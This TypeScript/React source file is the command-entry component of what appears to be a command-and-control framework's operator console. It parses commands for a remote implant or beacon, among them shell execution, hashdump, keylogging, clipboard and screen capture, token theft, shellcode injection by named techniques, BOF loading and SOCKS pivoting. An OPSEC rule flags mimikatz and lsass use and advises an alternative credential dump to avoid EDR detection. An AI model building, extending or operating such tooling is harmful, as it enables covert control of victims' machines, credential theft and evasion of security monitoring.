/**
 * CommandInput — semantic command entry for the active session.
 *
 * Design (Raijin-inspired): the first token (command name) is recognized and
 * rendered purple; remaining args render white. Unknown commands get a red
 * wavy underline + a hint. A static OPSEC rule warns on lsass-touching intent
 * (mimikatz / lsass) without blocking — inputs that don't parse (mimikatz)
 * fall through to the unknown-command path, while flagged commands that DO
 * parse (e.g. `shell procdump ... lsass`) submit and carry the opsec tag.
 *
 * Implementation: a translucent <input> sits on top of a styled overlay layer
 * that mirrors its text token-by-token. The input holds the value and cursor;
 * the overlay does the coloring. This avoids contentEditable's quirks while
 * still giving per-token color.
 *
 * History: ↑/↓ walk a per-session history of submitted lines (module-level
 * map, survives re-renders and session switches). Walking up stashes the
 * in-progress draft; walking past the newest entry restores it.
 */
import { useState, useRef, type KeyboardEvent, type ChangeEvent } from 'react';
import { invoke } from '@tauri-apps/api/core';
import type { JsonCommand, SessionView } from '../lib/types';
import './CommandInput.css';

export interface CommandInputProps {
  session: SessionView;
  onSubmit: (command: JsonCommand, label: string, opsec: boolean) => void;
}

/** Known command names (ls is parsed into a fileop on submit). */
const KNOWN_COMMANDS = [
  'ping', 'shell', 'exit', 'sleep',
  'download', 'upload', 'ls', 'cd', 'mkdir', 'rm', 'cp', 'mv', 'driveinfo',
  'screenshot', 'screenwatch', 'portscan', 'net', 'clipboard', 'env', 'keylog',
  'hashdump', 'stealtoken', 'steal', 'maketoken', 'rev2self', 'getuid',
  'bof', 'bof-iso', 'connect', 'setchannel', 'trex',
  'inject', 'socks', 'channeldata', 'chanwrite', 'channelclose',
] as const;

/** Static OPSEC trip: lsass-touching tooling. UI warning only, never blocks. */
const OPSEC_PATTERNS = /\b(mimikatz|lsass|procdump.*lsass|sekurlsa)\b/i;

/** Per-session input history, keyed by session id (no localStorage needed). */
const HISTORY = new Map<string, string[]>();
const HISTORY_CAP = 200;

/** Append a submitted line; dedupe only consecutive repeats, cap per session. */
function pushHistory(sessionId: string, line: string) {
  const hist = HISTORY.get(sessionId) ?? [];
  if (hist[hist.length - 1] !== line) hist.push(line);
  if (hist.length > HISTORY_CAP) hist.splice(0, hist.length - HISTORY_CAP);
  HISTORY.set(sessionId, hist);
}

export function CommandInput({ session, onSubmit }: CommandInputProps) {
  const [value, setValue] = useState('');
  // null = editing the draft; a number = walking HISTORY at that index.
  const [histIdx, setHistIdx] = useState<number | null>(null);
  // 「选择文件」选中的本地文件(hex 由 Rust read_file_hex 读好)。
  const [picked, setPicked] = useState<{ name: string; hex: string } | null>(null);
  // 解析/取值错误的明确中文提示(setchannel、screenshot 越界等)。
  const [errMsg, setErrMsg] = useState('');
  const draftRef = useRef('');
  const inputRef = useRef<HTMLInputElement>(null);

  const tokens = value.trim().split(/\s+/).filter(Boolean);
  const cmdName = tokens.length > 0 ? tokens[0].toLowerCase() : '';
  const known = cmdName === '' || KNOWN_COMMANDS.includes(cmdName as (typeof KNOWN_COMMANDS)[number]);
  const opsec = OPSEC_PATTERNS.test(value);
  const canPick = cmdName === 'bof' || cmdName === 'bof-iso' || cmdName === 'upload';

  /** 「选择文件」按钮:pick_file 选路径 → read_file_hex 读 hex,填入 picked。 */
  async function handlePick() {
    setErrMsg('');
    try {
      const isBof = cmdName !== 'upload';
      const path = await invoke<string | null>('pick_file', {
        title: isBof ? '选择 BOF (COFF .o) 文件' : '选择要上传的文件',
        filters: isBof ? ['o', 'obj'] : [],
      });
      if (!path) return; // 用户取消
      const hex = await invoke<string>('read_file_hex', { path });
      const name = path.split(/[\\/]/).pop() || path;
      setPicked({ name, hex });
      // 输入行只有命令名时,自动把文件名补成第一个参数
      if (tokens.length === 1) setValue(`${tokens[0]} ${name} `);
    } catch (e) {
      setErrMsg(String(e));
    }
  }

  function handleSubmit() {
    const trimmed = value.trim();
    if (!trimmed) return;
    const parsed = parseCommand(trimmed, picked?.hex ?? null);
    if (!parsed) return; // unknown command — refuse to submit, hint already shown
    if ('error' in parsed) {
      setErrMsg(parsed.error);
      return;
    }
    // exit 二次确认:防历史回放/误触直接杀掉 beacon
    if (
      parsed.command.type === 'exit' &&
      !window.confirm(`确认向 ${session.hostname} 发送 exit?beacon 将被终止。`)
    ) {
      return;
    }
    setErrMsg('');
    pushHistory(session.id, trimmed);
    onSubmit(parsed.command, parsed.label, opsec);
    setValue('');
    setHistIdx(null);
    setPicked(null);
  }

  /** Walk history: delta -1 = older entries, +1 = newer (draft past the end). */
  function recall(delta: -1 | 1) {
    const hist = HISTORY.get(session.id) ?? [];
    if (hist.length === 0) return;
    if (delta === -1) {
      if (histIdx === null) draftRef.current = value; // stash the in-progress draft
      const next = histIdx === null ? hist.length - 1 : Math.max(0, histIdx - 1);
      setHistIdx(next);
      setValue(hist[next] ?? '');
    } else {
      if (histIdx === null) return;
      const next = histIdx + 1;
      if (next >= hist.length) {
        setHistIdx(null);
        setValue(draftRef.current);
      } else {
        setHistIdx(next);
        setValue(hist[next] ?? '');
      }
    }
  }

  function handleKeyDown(e: KeyboardEvent<HTMLInputElement>) {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleSubmit();
    } else if (e.key === 'Escape') {
      e.preventDefault();
      setValue('');
      setHistIdx(null);
    } else if (e.key === 'ArrowUp') {
      // Single-line input: only hijack at line start (or mid-navigation) so
      // normal caret behavior elsewhere is untouched.
      if (histIdx !== null || e.currentTarget.selectionStart === 0) {
        e.preventDefault();
        recall(-1);
      }
    } else if (e.key === 'ArrowDown') {
      if (histIdx !== null || e.currentTarget.selectionStart === e.currentTarget.value.length) {
        e.preventDefault();
        recall(1);
      }
    }
  }

  function handleChange(e: ChangeEvent<HTMLInputElement>) {
    setValue(e.target.value);
    setHistIdx(null); // manual edits leave history-navigation mode
    setErrMsg('');
  }

  return (
    <div className="cmdinput">
      <div
        className={`cmdinput__wrap${known ? '' : ' cmdinput__wrap--unknown'}${opsec ? ' cmdinput__wrap--opsec' : ''}`}
        onClick={() => inputRef.current?.focus()}
        role="presentation"
      >
        <span className="cmdinput__prompt mono" aria-hidden>$</span>

        {/* Overlay: colored token rendering, sits behind the input */}
        <span className="cmdinput__overlay mono" aria-hidden>
          {tokens.length === 0 ? (
            <span className="cmdinput__placeholder">
              输入命令… ping / shell / download / ls / bof-iso / channeldata / chanwrite
            </span>
          ) : (
            <>
              <span className={`cmdinput__tok cmdinput__tok--cmd${known ? '' : ' cmdinput__tok--bad'}`}>
                {tokens[0]}
              </span>
              {tokens.slice(1).map((tok, i) => (
                <span key={i} className="cmdinput__tok cmdinput__tok--arg">
                  {tok}
                </span>
              ))}
            </>
          )}
        </span>

        {/* The real input: transparent text, holds value + caret */}
        <input
          ref={inputRef}
          className="cmdinput__input mono"
          type="text"
          value={value}
          spellCheck={false}
          autoComplete="off"
          autoCapitalize="off"
          autoCorrect="off"
          placeholder=""
          onChange={handleChange}
          onKeyDown={handleKeyDown}
          aria-label={`命令输入 — session ${session.hostname}`}
        />
      </div>

      {/* bof / upload 的本地文件选择条(hex 已读好,提交时进 data_hex) */}
      {canPick && (
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '0 var(--sp-2)' }}>
          <button
            type="button"
            className="mono"
            style={{ fontSize: 11, padding: '2px 8px', cursor: 'pointer' }}
            onClick={handlePick}
          >
            选择文件
          </button>
          {picked && (
            <span className="mono" style={{ fontSize: 11, color: 'var(--text-faint)' }}>
              已选 {picked.name}({picked.hex.length / 2} 字节)
            </span>
          )}
        </div>
      )}

      <div className="cmdinput__hints">
        {!known && (
          <span className="cmdinput__hint cmdinput__hint--err">
            未知命令。常用: ping / shell / download / ls / net / screenshot / bof / channeldata / chanwrite …
          </span>
        )}
        {errMsg && (
          <span className="cmdinput__hint cmdinput__hint--err">{errMsg}</span>
        )}
        {opsec && (
          <span className="cmdinput__hint cmdinput__hint--opsec">
            ⚠ OPSEC 风险高：触碰 lsass 可能触发 EDR。建议 hashdump --method sam
          </span>
        )}
      </div>
    </div>
  );
}

/* ----------------------------- command parsing ----------------------------- */

export interface ParsedCommand {
  command: JsonCommand;
  label: string;
}

/** 解析失败但原因明确(参数越界等)时返回的报错,UI 直接展示。 */
export interface ParseError {
  error: string;
}

/**
 * Parse a raw input line into a JsonCommand + display label.
 * Returns null for unknown commands (caller shows the unknown hint),
 * a ParseError for recognized-but-invalid args (caller shows the message).
 * pickedHex:「选择文件」读到的本地文件 hex,bof / upload 用来填 data_hex。
 *
 * Grammar (recognized names = KNOWN_COMMANDS; representative forms):
 *   ping
 *   shell <args...>          args joined back into one string
 *   exit
 *   sleep <sec> [jitter]
 *   download <path>
 *   cd <path>
 *   ls [path]                 -> emitted as a fileop (op 'ls', supported
 *                                end-to-end: protocol FileOp::Ls wire tag 5,
 *                                server mapping, implant fileop_ls).
 *   bof <name> [isolate] [args...] / channeldata <chan> <hex> /
 *   chanwrite <chan> <text...>  (see the switch below for the rest)
 */
export function parseCommand(
  line: string,
  pickedHex: string | null = null,
): ParsedCommand | ParseError | null {
  const trimmed = line.trim();
  if (!trimmed) return null;
  const parts = trimmed.split(/\s+/);
  const name = parts[0].toLowerCase();
  const args = parts.slice(1);

  switch (name) {
    case 'ping':
      return { command: { type: 'ping' }, label: 'ping' };

    case 'shell': {
      if (args.length === 0) return null;
      const shellArgs = args.join(' ');
      return { command: { type: 'shell', args: shellArgs }, label: `shell ${shellArgs}` };
    }

    case 'exit':
      return { command: { type: 'exit' }, label: 'exit' };

    case 'sleep': {
      if (args.length === 0) return null;
      const seconds = parseInt(args[0], 10);
      if (!Number.isFinite(seconds) || seconds <= 0) return null;
      let jitter = 0;
      if (args.length >= 2) {
        const j = parseInt(args[1], 10);
        // Server field is jitter_pct: u8 and the implant treats it as a
        // percentage (span = base * jitter / 100), so reject anything outside
        // 0..=100 instead of sending a value serde will 400 on.
        if (Number.isFinite(j) && j >= 0 && j <= 100) jitter = j;
        else return null;
      }
      return {
        command: { type: 'sleep', seconds, jitter_pct: jitter },
        label: `sleep ${seconds}${jitter ? ` ${jitter}` : ''}`,
      };
    }

    case 'download': {
      if (args.length === 0) return null;
      const path = args.join(' ');
      return { command: { type: 'download', path }, label: `download ${path}` };
    }

    case 'cd': {
      if (args.length === 0) return null;
      const path = args.join(' ');
      return { command: { type: 'fileop', op: 'cd', path }, label: `cd ${path}` };
    }

    case 'ls': {
      const path = args.length > 0 ? args.join(' ') : '.';
      return {
        command: { type: 'fileop', op: 'ls', path },
        label: `ls ${path}`,
      };
    }

    // --- more file ops ---
    case 'mkdir':
    case 'rm':
    case 'cp':
    case 'mv': {
      if (args.length === 0) return null;
      const path = args[0];
      const dest = args.length > 1 ? args[1] : undefined;
      return {
        command: { type: 'fileop', op: name as 'mkdir' | 'rm' | 'cp' | 'mv', path, dest },
        label: `${name} ${path}${dest ? ` ${dest}` : ''}`,
      };
    }

    case 'driveinfo':
      return { command: { type: 'driveinfo' }, label: 'driveinfo' };

    // --- recon / collection ---
    case 'screenshot': {
      const monitor = args.length > 0 ? parseInt(args[0], 10) : 0;
      const m = Number.isFinite(monitor) ? monitor : 0;
      // Server field is monitor: u8 — 越界直接中文报错,别让 server 400。
      if (m < 0 || m > 255) {
        return { error: `screenshot 的 monitor 必须在 0-255 之间(收到 ${args[0]})` };
      }
      return {
        command: { type: 'screenshot', monitor: m },
        label: `screenshot ${m}`,
      };
    }

    case 'portscan': {
      if (args.length < 2) return null;
      return {
        command: { type: 'portscan', host: args[0], ports: args[1] },
        label: `portscan ${args[0]} ${args[1]}`,
      };
    }

    case 'net': {
      if (args.length === 0) return null;
      const query = args.join(' ');
      return { command: { type: 'net', query }, label: `net ${query}` };
    }

    case 'clipboard':
      return { command: { type: 'clipboard' }, label: 'clipboard' };

    case 'env': {
      const envName = args.length > 0 ? args[0] : '';
      return { command: { type: 'env', name: envName }, label: `env ${envName || '(all)'}` };
    }

    case 'keylog': {
      if (args.length === 0) return null;
      const action = parseInt(args[0], 10);
      if (![0, 1, 2].includes(action)) return null;
      return { command: { type: 'keylog', action }, label: `keylog ${action}` };
    }

    // --- credentials / tokens ---
    case 'hashdump': {
      const method = args.length > 0 ? parseInt(args[0], 10) : 0;
      return {
        command: { type: 'hashdump', method: [0, 1].includes(method) ? method : 0 },
        label: `hashdump ${method}`,
      };
    }

    case 'stealtoken':
    case 'steal': {
      if (args.length === 0) return null;
      const pid = parseInt(args[0], 10);
      if (!Number.isFinite(pid)) return null;
      return { command: { type: 'stealtoken', pid }, label: `stealtoken ${pid}` };
    }

    case 'maketoken': {
      // maketoken DOMAIN\user password [logon_type]
      // logon_type: 1=interactive(默认) 2=network 3=new-credentials (server doc,
      // crates/server/src/lib.rs). Default to 1; reject out-of-range values so
      // the u8 field never receives an invalid number.
      if (args.length < 2) return null;
      let logonType = 1;
      if (args.length > 2) {
        const lt = parseInt(args[2], 10);
        if (![1, 2, 3].includes(lt)) return null;
        logonType = lt;
      }
      return {
        command: {
          type: 'maketoken',
          domain: args[0].split('\\')[0] || '',
          user: args[0].includes('\\') ? args[0].split('\\').slice(1).join('\\') : args[0],
          password: args[1],
          logon_type: logonType,
        },
        label: `maketoken ${args[0]}`,
      };
    }

    case 'rev2self':
      return { command: { type: 'rev2self' }, label: 'rev2self' };

    case 'getuid':
      return { command: { type: 'getuid' }, label: 'getuid' };

    // --- execution ---
    case 'bof':
    case 'bof-iso': {
      // bof <name> [args...] | bof <name> isolate [args...] | bof-iso <name> [args...]
      // `isolate` (B3): run the BOF in a sacrificial bof-host child instead of
      // inline in the beacon — a crashed BOF kills the child, not the beacon.
      // data_hex 来自「选择文件」读到的 COFF;未选则空串(旧行为,implant 会失败,
      // 由下方报错拦截)。
      if (args.length === 0) return null;
      if (!pickedHex) return { error: 'bof 需要 COFF 文件:先点「选择文件」选中 .o' };
      const isolate = name === 'bof-iso' || args[1] === 'isolate';
      const bofArgs = args[1] === 'isolate' ? args.slice(2) : args.slice(1);
      return {
        command: {
          type: 'bof', name: args[0], args: bofArgs, data_hex: pickedHex,
          ...(isolate ? { isolate: true } : {}),
        },
        label: `${isolate ? 'bof-iso' : 'bof'} ${args[0]} (${pickedHex.length / 2} bytes)`,
      };
    }

    case 'screenwatch': {
      const interval = args.length > 0 ? parseInt(args[0], 10) : 10;
      return {
        command: { type: 'screenwatch', interval_secs: Number.isFinite(interval) ? interval : 10 },
        label: `screenwatch ${interval}`,
      };
    }

    case 'connect': {
      if (args.length < 2) return null;
      const port = parseInt(args[1], 10);
      // Server field is port: u16 (crates/server/src/lib.rs) — reject 0 and
      // anything above 65535 instead of sending a value serde will 400 on.
      if (!Number.isFinite(port) || port < 1 || port > 65535) return null;
      return {
        command: { type: 'connect', host: args[0], port },
        label: `connect ${args[0]}:${port}`,
      };
    }

    case 'setchannel': {
      if (args.length === 0) return null;
      const ch = parseInt(args[0], 10);
      if (!Number.isFinite(ch)) return null;
      // Server field is channel: u8 — 越界直接中文报错,别让 server 400。
      if (ch < 0 || ch > 255) {
        return { error: `setchannel 的 channel 必须在 0-255 之间(收到 ${ch})` };
      }
      return { command: { type: 'setchannel', channel: ch }, label: `setchannel ${ch}` };
    }

    case 'trex':
      return { command: { type: 'trex' }, label: 'trex' };

    // --- injection ---
    case 'inject': {
      // inject <method> <pid> <spawn_to> <hex_shellcode>
      // method: 0=pool_party 1=threadless 2=module_stomp 3=fls_callback
      if (args.length < 3) return null;
      const method = parseInt(args[0], 10) || 0;
      const pid = parseInt(args[1], 10);
      if (!Number.isFinite(pid)) return null;
      const spawn_to = args[2];
      // args[3..] joined as hex string (or empty if inline-loaded via UI)
      const sc_hex = args.slice(3).join('') || '';
      return {
        command: { type: 'inject', method, pid, spawn_to, sc_hex },
        label: `inject ${method} ${pid} ${spawn_to}`,
      };
    }

    // --- channels / pivots ---
    case 'socks': {
      // socks <chan> <op> <addr> <port>
      if (args.length < 4) return null;
      const sport = parseInt(args[3], 10);
      // Server field is port: u16 — same bound as `connect`.
      if (!Number.isFinite(sport) || sport < 1 || sport > 65535) return null;
      return {
        command: {
          type: 'socks',
          chan: parseInt(args[0], 10) || 0,
          op: parseInt(args[1], 10) || 0,
          addr: args[2],
          port: sport,
        },
        label: `socks chan=${args[0]} op=${args[1]} ${args[2]}:${sport}`,
      };
    }

    case 'channeldata': {
      // channeldata <chan> <hex> — write bytes into a relay channel
      // (operator→implant direction, e.g. SOCKS/rportfwd 回写). Hex validated
      // here so the server never 400s on malformed input.
      if (args.length < 2) return null;
      const chan = parseInt(args[0], 10);
      if (!Number.isFinite(chan)) return null;
      const data_hex = args.slice(1).join('');
      if (data_hex.length === 0 || data_hex.length % 2 !== 0 || !/^[0-9a-fA-F]+$/.test(data_hex)) return null;
      return {
        command: { type: 'channeldata', chan, data_hex: data_hex.toLowerCase() },
        label: `channeldata ${chan} (${data_hex.length / 2} bytes)`,
      };
    }

    case 'chanwrite': {
      // chanwrite <chan> <text...> — same write path as channeldata, with the
      // payload given as UTF-8 text (hex-encoded here for the wire).
      if (args.length < 2) return null;
      const chan = parseInt(args[0], 10);
      if (!Number.isFinite(chan)) return null;
      const bytes = new TextEncoder().encode(args.slice(1).join(' '));
      const data_hex = Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('');
      return {
        command: { type: 'channeldata', chan, data_hex },
        label: `chanwrite ${chan} (${bytes.length} bytes)`,
      };
    }

    case 'channelclose': {
      // channelclose <chan>
      if (args.length === 0) return null;
      const chan = parseInt(args[0], 10);
      if (!Number.isFinite(chan)) return null;
      return { command: { type: 'channelclose', chan }, label: `channelclose ${chan}` };
    }

    // --- file upload (hex data inline, or via the「选择文件」button) ---
    case 'upload': {
      // upload <name> [hex_data] —— 手贴 hex 优先(现有路径);没贴则用
      // 「选择文件」读到的 hex;两者都没有则明确报错。
      if (args.length === 0) return null;
      const name = args[0];
      const data_hex = args.slice(1).join('') || pickedHex || '';
      if (!data_hex) return { error: 'upload 需要数据:手贴 hex 或点「选择文件」' };
      return {
        command: { type: 'upload', name, data_hex },
        label: `upload ${name} (${data_hex.length / 2} bytes)`,
      };
    }

    default:
      return null;
  }
}
